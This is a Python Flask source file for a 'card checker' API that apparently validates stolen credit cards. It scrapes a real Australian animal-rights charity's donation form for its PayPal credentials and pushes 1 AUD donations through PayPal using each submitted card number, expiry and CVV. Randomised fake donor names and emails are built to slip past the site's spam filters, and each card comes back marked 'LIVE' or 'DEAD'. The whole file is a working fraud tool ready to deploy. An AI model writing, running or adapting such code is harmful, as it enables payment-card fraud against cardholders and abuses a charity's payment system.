# Dev : @xoxhunterxd
import requests
import re
import random
import string
import base64
import json
from flask import Flask, request, jsonify

app = Flask(__name__)

def random_string(length):
    """Matches randomString function from checker.js line 4."""
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def generate_real_email():
    """Generates 100% random, high-entropy emails to bypass GiveWP SPAM filters."""
    domains = ["gmail.com", "yahoo.com", "icloud.com", "proton.me", "mail.com", "zoho.com", "gmx.com"]
    # Mixing characters and numbers for a more 'human' look
    prefix = random_string(random.randint(7, 10))
    suffix = str(random.randint(10, 999))
    return f"{prefix}{suffix}@{random.choice(domains)}"

@app.route('/check', methods=['GET'])
def check_card():
    cc_param = request.args.get('cc')
    
    if not cc_param or cc_param.count('|') != 3:
        return jsonify({"status": "DEAD", "msg": "INVALID_FORMAT", "dev": "@xoxhunterxd"})

    try:
        # Matches argument splitting in checker.js line 39
        number, month, year_short, cvv = cc_param.split('|')
        month = month.zfill(2)
        year_full = f"20{year_short[-2:]}"
    except Exception:
        return jsonify({"status": "DEAD", "msg": "PARSE_ERROR", "dev": "@xoxhunterxd"})

    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
    })

    try:
        # 1. Fetch Form URL and Settings (Matches checker.js line 46-51)
        html = session.get('https://animalrights.org.au/donate-now/').text
        form_url = re.search(r"data-form-view-url='([^']+)'", html).group(1).replace('&#038;', '&')
        
        form_html = session.get(form_url).text
        exported = re.search(r'window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});', form_html).group(1)
        data = json.loads(exported)

        # 2. Extract PayPal Config and Get Token (Matches checker.js line 53-73)
        gateway = next((g for g in data['registeredGateways'] if g['id'] == 'paypal-commerce'), data['registeredGateways'][0])
        settings = gateway['settings']
        client_id = settings['sdkOptions']['clientId']
        
        auth = base64.b64encode(f"{client_id}:".encode()).decode()
        token_res = session.post('https://www.paypal.com/v1/oauth2/token', 
                                 headers={'Authorization': f'Basic {auth}', 'Accept': 'application/json'},
                                 data='grant_type=client_credentials').json()
        access_token = token_res.get('access_token')

        # 3. Create AJAX Order (Matches checker.js line 81-100)
        user_first = random_string(7).capitalize()
        user_last = random_string(7).capitalize()
        user_email = generate_real_email()
        
        ajax_payload = {
            'action': 'give_paypal_commerce_create_order',
            'give-form-id': str(settings['donationFormId']),
            'give-form-hash': settings['donationFormNonce'],
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': user_first,
            'give_last': user_last,
            'give_email': user_email,
            'give-cs-form-currency': 'AUD',
        }
        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_payload).json()
        order_id = order_res['data']['id']

        # 4. Confirm Card via PayPal (Matches checker.js line 105-125)
        confirm_res = session.post(
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
            json={
                "payment_source": {
                    "card": {
                        "number": number,
                        "security_code": cvv,
                        "expiry": f"{year_full}-{month}",
                    }
                }
            }
        ).json()

        # 5. Result Analysis (Refining logic for APPROVED vs SITE SPAM)
        if confirm_res.get('status') == 'APPROVED':
            # Extract routing parameters for the final hit
            params = dict(re.findall(r'([^?&]+)=([^&]+)', data['donateUrl']))
            
            final_form = {
                'amount': '1',
                'currency': 'AUD',
                'donationType': 'single',
                'formId': str(settings['donationFormId']),
                'gatewayId': 'paypal-commerce',
                'firstName': user_first,
                'lastName': user_last,
                'email': user_email,
                'anonymous': 'false',
                'isEmbed': 'true',
                'locale': 'en_AU',
                'gatewayData[payPalOrderId]': order_id,
                'originUrl': 'https://animalrights.org.au/donate-now/',
            }
            
            # Final verification hit
            final_res = session.post('https://animalrights.org.au/', params={
                'givewp-route': 'donate',
                'givewp-route-signature': params.get('givewp-route-signature'),
                'givewp-route-signature-id': params.get('givewp-route-signature-id'),
                'givewp-route-signature-expiration': params.get('givewp-route-signature-expiration'),
            }, data=final_form)

            # Check if the site output actually indicates success
            if '"success":true' in final_res.text.lower():
                return jsonify({
                    "status": "LIVE",
                    "card": cc_param,
                    "msg": "Approved",
                    "dev": "@xoxhunterxd",
                    "raw_response": final_res.text
                })
            else:
                # Catching the SPAM flag or site error as a DEAD status
                return jsonify({
                    "status": "DEAD",
                    "card": cc_param,
                    "msg": "Site Security Block (Flagged)",
                    "dev": "@xoxhunterxd",
                    "raw_response": final_res.text
                })
        else:
            # Standard PayPal decline
            msg = confirm_res.get('message', 'DECLINED')
            if 'details' in confirm_res:
                msg = confirm_res['details'][0].get('issue', 'DECLINED')
            return jsonify({"status": "DEAD", "card": cc_param, "msg": msg, "dev": "@xoxhunterxd"})

    except Exception as e:
        return jsonify({"status": "DEAD", "card": cc_param, "msg": "GATEWAY_ERROR", "dev": "@xoxhunterxd"}), 200

# Vercel entrypoint
application = app
            
